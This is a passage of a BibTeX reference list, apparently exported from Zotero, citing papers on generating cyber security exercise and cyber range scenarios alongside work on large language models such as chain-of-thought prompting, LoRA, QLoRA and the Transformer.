	abstract = {Content generation that is both relevant and up to date with the current threats of the target audience is a critical element in the success of any cyber security exercise (CSE). Through this work, we explore the results of applying machine learning techniques to unstructured information sources to generate structured CSE content. The corpus of our work is a large dataset of publicly available cyber security articles that have been used to predict future threats and to form the skeleton for new exercise scenarios. Machine learning techniques, like named entity recognition and topic extraction, have been utilised to structure the information based on a novel ontology we developed, named Cyber Exercise Scenario Ontology (CESO). Moreover, we used clustering with outliers to classify the generated extracted data into objects of our ontology. Graph comparison methodologies were used to match generated scenario fragments to known threat actors’ tactics and help enrich the proposed scenario accordingly with the help of synthetic text generators. CESO has also been chosen as the prominent way to express both fragments and the final proposed scenario content by our AI-assisted Cyber Exercise Framework. Our methodology was assessed by providing a set of generated scenarios for evaluation to a group of experts to be used as part of a real-world awareness tabletop exercise.},
	language = {en},
	number = {5},
	urldate = {2024-12-01},
	journal = {International Journal of Information Security},
	author = {Zacharis, Alexandros and Patsakis, Constantinos},
	month = oct,
	year = {2023},
	keywords = {Artificial Intelligence, Artificial intelligence, Cyber security exercise ontology, Cyber security exercise scenario},
	pages = {1333--1354},
}

@inproceedings{nakata_cyexec_2021,
	address = {Online Streaming, --- Select a Country ---},
	title = {{CyExec}*: {Automatic} {Generation} of {Randomized} {Cyber} {Range} {Scenarios}:},
	isbn = {978-989-758-491-6},
	shorttitle = {{CyExec}*},
	url = {https://www.scitepress.org/DigitalLibrary/Link.aspx?doi=10.5220/0010324502260236},
	doi = {10.5220/0010324502260236},
	abstract = {With the development of information technology, the need for information security education is increasing, and the effectiveness of cyber range exercises is attracting attention. The cyber range is a system to learn knowledge and skills by experiencing an incident scenario reproduced in a virtual environment. Many scenarios are required to train a security expert through various incident experiences. However, scenario development requires highly specialized expertise. Thus, in practice, only a limited number of scenarios are worn out around. Identical scenarios may decrease the educational effect since the other teams’ actions or write-ups on the internet will hint the students. We propose CyExec*, a cyber range system that automatically generates multiple scenarios based on DAG(Directed Acyclic Graph)-based scenario randomization. Multiple scenarios with the same learning objectives can enhance teaching effectiveness and prevent cheating. We developed the DAGbased scenario randomization technique on a Docker-based cyber range system called CyExec. By taking full advantage of Docker’s system/network configuration power, we can randomize complex scenarios across multiple networks. Comparison with the VM-based scenario generators, CyExec* outperforms, especially in storage usage. Further, CyExec∗ only consumes 1/3 memories, 1/4 CPU loads, and 1/10 storage usages. Thus, Cyexec∗ can operate approximately 3-times more complex scenarios than VM-based systems.},
	urldate = {2024-12-01},
	booktitle = {Proceedings of the 7th {International} {Conference} on {Information} {Systems} {Security} and {Privacy}},
	publisher = {SCITEPRESS - Science and Technology Publications},
	author = {Nakata, Ryotaro and Otsuka, Akira},
	year = {2021},
	pages = {226--236},
}

@article{yamin_serious_2021,
	title = {Serious games as a tool to model attack and defense scenarios for cyber-security exercises},
	volume = {110},
	issn = {0167-4048},
	url = {https://www.sciencedirect.com/science/article/pii/S0167404821002741},
	doi = {10.1016/j.cose.2021.102450},
	abstract = {Technology is evolving rapidly; this poses a problem for security specialists and average citizens as their technological skill sets are quickly made obsolete. This makes the knowledge and understanding of cyber-security in a technologically evolving world difficult. Global IT infrastructure and individuals’ privacy are constantly under threat. One way to tackle this problem is by providing continuous training and self-learning platforms. Cyber-security exercises can provide a necessary platform for training people’s cyber-security skills. However, conducting cyber-security exercises with new and unique scenarios requires comprehensive planning and commitment to the preparation time and resources. In this work, we propose a serious game for the development of cyber-security exercise scenarios. The game provides a platform to model simulated cyber-security exercise scenarios, transforming them into an emulated cyber-security exercise environment using domain-specific language (DSL) and infrastructure orchestration. In this game, players can play as cyber attackers or defenders in a multiplayer environment to make operational cyber-security decisions in real-time. The decisions are evaluated for the development of operational cyber-attack and defense strategies.},
	urldate = {2024-12-01},
	journal = {Computers \& Security},
	author = {Yamin, Muhammad Mudassar and Katt, Basel and Nowostawski, Mariusz},
	month = nov,
	year = {2021},
	keywords = {Attack, Cyber range, Cyber-security, Defense, Exercises, Scenarios},
	pages = {102450},
}

@misc{noauthor_applications_nodate,
	title = {Applications of {LLMs} for {Generating} {Cyber} {Security} {Exercise} {Scenarios} {\textbar} {IEEE} {Journals} \& {Magazine} {\textbar} {IEEE} {Xplore}},
	url = {https://ieeexplore.ieee.org/document/10695083},
	urldate = {2024-12-01},
}

@misc{wei_chain--thought_2023,
	title = {Chain-of-{Thought} {Prompting} {Elicits} {Reasoning} in {Large} {Language} {Models}},
	url = {http://arxiv.org/abs/2201.11903},
	doi = {10.48550/arXiv.2201.11903},
	abstract = {We explore how generating a chain of thought -- a series of intermediate reasoning steps -- significantly improves the ability of large language models to perform complex reasoning. In particular, we show how such reasoning abilities emerge naturally in sufficiently large language models via a simple method called chain of thought prompting, where a few chain of thought demonstrations are provided as exemplars in prompting. Experiments on three large language models show that chain of thought prompting improves performance on a range of arithmetic, commonsense, and symbolic reasoning tasks. The empirical gains can be striking. For instance, prompting a 540B-parameter language model with just eight chain of thought exemplars achieves state of the art accuracy on the GSM8K benchmark of math word problems, surpassing even finetuned GPT-3 with a verifier.},
	urldate = {2024-11-26},
	publisher = {arXiv},
	author = {Wei, Jason and Wang, Xuezhi and Schuurmans, Dale and Bosma, Maarten and Ichter, Brian and Xia, Fei and Chi, Ed and Le, Quoc and Zhou, Denny},
	month = jan,
	year = {2023},
	note = {arXiv:2201.11903},
	keywords = {Computer Science - Artificial Intelligence, Computer Science - Computation and Language},
}

@misc{noauthor_zotero_nodate,
	title = {Zotero {\textbar} {Your} personal research assistant},
	url = {https://www.zotero.org/mission-deny-the-mission/library},
	urldate = {2024-11-26},
}

@misc{noauthor_zotero_nodate-1,
	title = {Zotero {\textbar} {Your} personal research assistant},
	url = {https://www.zotero.org/},
	urldate = {2024-11-26},
}

@article{schreuders_open_nodate,
	title = {An open cloud-based virtual lab environment for computer security education},
	abstract = {Providing an environment that enables students to gain hands-on experience with security tools in rich and complex learning scenarios, while granting them the freedom to experiment with potentially harmful tools, is an issue for many universities and organisations. As is the challenge of enabling students the flexibility to work from home. This paper presents the results of a pilot study of our proposed solution based on oVirt. Opportunities for improvements are identified, and it is concluded that oVirt is a feasible platform on which to build a lab environment for teaching computer security.},
	language = {en},
	author = {Schreuders, Z Cliffe and Butterfield, Emlyn and Staniforth, Paul},
}

@article{schreuders_generating_nodate,
	title = {Generating randomised virtualised scenarios for ethical hacking and computer security education},
	abstract = {Computer security students benefit from having hands-on experience with hacking tools and with access to vulnerable systems that they can attack and defend. However, vulnerable VMs are static; once they have been exploited by a student there is no repeatable challenge as the vulnerable boxes never change. A new novel solution, SecGen, has been created and deployed. SecGen solves the issue by creating vulnerable machines with randomised vulnerabilities and services, with constraints that ensure each scenario is catered to specific skills or concepts. SecGen was successfully deployed to generate VMs for a second year undergraduate team module. Future plans are discussed.},
	language = {en},
	author = {Schreuders, Z Cliffe and Ardern, Lewis},
}

@misc{noauthor_httpsarxivorgpdf210609685_nodate,
	title = {https://arxiv.org/pdf/2106.09685},
	url = {https://arxiv.org/pdf/2106.09685},
	urldate = {2024-11-05},
}

@misc{hu_lora_2021,
	title = {{LoRA}: {Low}-{Rank} {Adaptation} of {Large} {Language} {Models}},
	shorttitle = {{LoRA}},
	url = {http://arxiv.org/abs/2106.09685},
	abstract = {An important paradigm of natural language processing consists of large-scale pretraining on general domain data and adaptation to particular tasks or domains. As we pre-train larger models, full ﬁne-tuning, which retrains all model parameters, becomes less feasible. Using GPT-3 175B as an example – deploying independent instances of ﬁne-tuned models, each with 175B parameters, is prohibitively expensive. We propose Low-Rank Adaptation, or LoRA, which freezes the pretrained model weights and injects trainable rank decomposition matrices into each layer of the Transformer architecture, greatly reducing the number of trainable parameters for downstream tasks. Compared to GPT-3 175B ﬁne-tuned with Adam, LoRA can reduce the number of trainable parameters by 10,000 times and the GPU memory requirement by 3 times. LoRA performs on-par or better than ﬁnetuning in model quality on RoBERTa, DeBERTa, GPT-2, and GPT-3, despite having fewer trainable parameters, a higher training throughput, and, unlike adapters, no additional inference latency. We also provide an empirical investigation into rank-deﬁciency in language model adaptation, which sheds light on the efﬁcacy of LoRA. We release a package that facilitates the integration of LoRA with PyTorch models and provide our implementations and model checkpoints for RoBERTa, DeBERTa, and GPT-2 at https://github.com/microsoft/LoRA.},
	language = {en},
	urldate = {2024-11-03},
	publisher = {arXiv},
	author = {Hu, Edward J. and Shen, Yelong and Wallis, Phillip and Allen-Zhu, Zeyuan and Li, Yuanzhi and Wang, Shean and Wang, Lu and Chen, Weizhu},
	month = oct,
	year = {2021},
	note = {arXiv:2106.09685 [cs]},
	keywords = {Computer Science - Artificial Intelligence, Computer Science - Computation and Language, Computer Science - Machine Learning},
}

@misc{dettmers_qlora_2023,
	title = {{QLoRA}: {Efficient} {Finetuning} of {Quantized} {LLMs}},
	shorttitle = {{QLoRA}},
	url = {http://arxiv.org/abs/2305.14314},
	abstract = {We present QLoRA, an efficient finetuning approach that reduces memory usage enough to finetune a 65B parameter model on a single 48GB GPU while preserving full 16-bit finetuning task performance. QLoRA backpropagates gradients through a frozen, 4-bit quantized pretrained language model into Low Rank Adapters{\textasciitilde}(LoRA). Our best model family, which we name Guanaco, outperforms all previous openly released models on the Vicuna benchmark, reaching 99.3\% of the performance level of ChatGPT while only requiring 24 hours of finetuning on a single GPU. QLoRA introduces a number of innovations to save memory without sacrificing performance: (a) 4-bit NormalFloat (NF4), a new data type that is information theoretically optimal for normally distributed weights (b) double quantization to reduce the average memory footprint by quantizing the quantization constants, and (c) paged optimziers to manage memory spikes. We use QLoRA to finetune more than 1,000 models, providing a detailed analysis of instruction following and chatbot performance across 8 instruction datasets, multiple model types (LLaMA, T5), and model scales that would be infeasible to run with regular finetuning (e.g. 33B and 65B parameter models). Our results show that QLoRA finetuning on a small high-quality dataset leads to state-of-the-art results, even when using smaller models than the previous SoTA. We provide a detailed analysis of chatbot performance based on both human and GPT-4 evaluations showing that GPT-4 evaluations are a cheap and reasonable alternative to human evaluation. Furthermore, we find that current chatbot benchmarks are not trustworthy to accurately evaluate the performance levels of chatbots. A lemon-picked analysis demonstrates where Guanaco fails compared to ChatGPT. We release all of our models and code, including CUDA kernels for 4-bit training.},
	language = {en},
	urldate = {2024-11-03},
	publisher = {arXiv},
	author = {Dettmers, Tim and Pagnoni, Artidoro and Holtzman, Ari and Zettlemoyer, Luke},
	month = may,
	year = {2023},
	note = {arXiv:2305.14314 [cs]},
	keywords = {Computer Science - Machine Learning},
}

@misc{gan_large_2023,
	title = {Large {Language} {Models} in {Education}: {Vision} and {Opportunities}},
	shorttitle = {Large {Language} {Models} in {Education}},
	url = {http://arxiv.org/abs/2311.13160},
	abstract = {With the rapid development of artificial intelligence technology, large language models (LLMs) have become a hot research topic. Education plays an important role in human social development and progress. Traditional education faces challenges such as individual student differences, insufficient allocation of teaching resources, and assessment of teaching effectiveness. Therefore, the applications of LLMs in the field of digital/smart education have broad prospects. The research on educational large models (EduLLMs) is constantly evolving, providing new methods and approaches to achieve personalized learning, intelligent tutoring, and educational assessment goals, thereby improving the quality of education and the learning experience. This article aims to investigate and summarize the application of LLMs in smart education. It first introduces the research background and motivation of LLMs and explains the essence of LLMs. It then discusses the relationship between digital education and EduLLMs and summarizes the current research status of educational large models. The main contributions are the systematic summary and vision of the research background, motivation, and application of large models for education (LLM4Edu). By reviewing existing research, this article provides guidance and insights for educators, researchers, and policy-makers to gain a deep understanding of the potential and challenges of LLM4Edu. It further provides guidance for further advancing the development and application of LLM4Edu, while still facing technical, ethical, and practical challenges requiring further research and exploration.},
	language = {en},
	urldate = {2024-11-03},
	publisher = {arXiv},
	author = {Gan, Wensheng and Qi, Zhenlian and Wu, Jiayang and Lin, Jerry Chun-Wei},
	month = nov,
	year = {2023},
	note = {arXiv:2311.13160 [cs]},
	keywords = {Computer Science - Artificial Intelligence},
}

@misc{vaswani_attention_2023,
	title = {Attention {Is} {All} {You} {Need}},
	url = {http://arxiv.org/abs/1706.03762},
	doi = {10.48550/arXiv.1706.03762},
	abstract = {The dominant sequence transduction models are based on complex recurrent or convolutional neural networks in an encoder-decoder configuration. The best performing models also connect the encoder and decoder through an attention mechanism. We propose a new simple network architecture, the Transformer, based solely on attention mechanisms, dispensing with recurrence and convolutions entirely. Experiments on two machine translation tasks show these models to be superior in quality while being more parallelizable and requiring significantly less time to train. Our model achieves 28.4 BLEU on the WMT 2014 English-to-German translation task, improving over the existing best results, including ensembles by over 2 BLEU. On the WMT 2014 English-to-French translation task, our model establishes a new single-model state-of-the-art BLEU score of 41.8 after training for 3.5 days on eight GPUs, a small fraction of the training costs of the best models from the literature. We show that the Transformer generalizes well to other tasks by applying it successfully to English constituency parsing both with large and limited training data.},
	urldate = {2024-10-19},
	publisher = {arXiv},
	author = {Vaswani, Ashish and Shazeer, Noam and Parmar, Niki and Uszkoreit, Jakob and Jones, Llion and Gomez, Aidan N. and Kaiser, Lukasz and Polosukhin, Illia},
	month = aug,
	year = {2023},
	note = {arXiv:1706.03762},
	keywords = {Computer Science - Computation and Language, Computer Science - Machine Learning},
}

@misc{noauthor_constructivism_nodate,
	title = {Constructivism},
	url = {https://www.buffalo.edu/catt/teach/develop/theory/constructivism.html},
	abstract = {Creating experiences that facilitate the construction of knowledge.},
	language = {en},
	urldate = {2024-10-17},
}
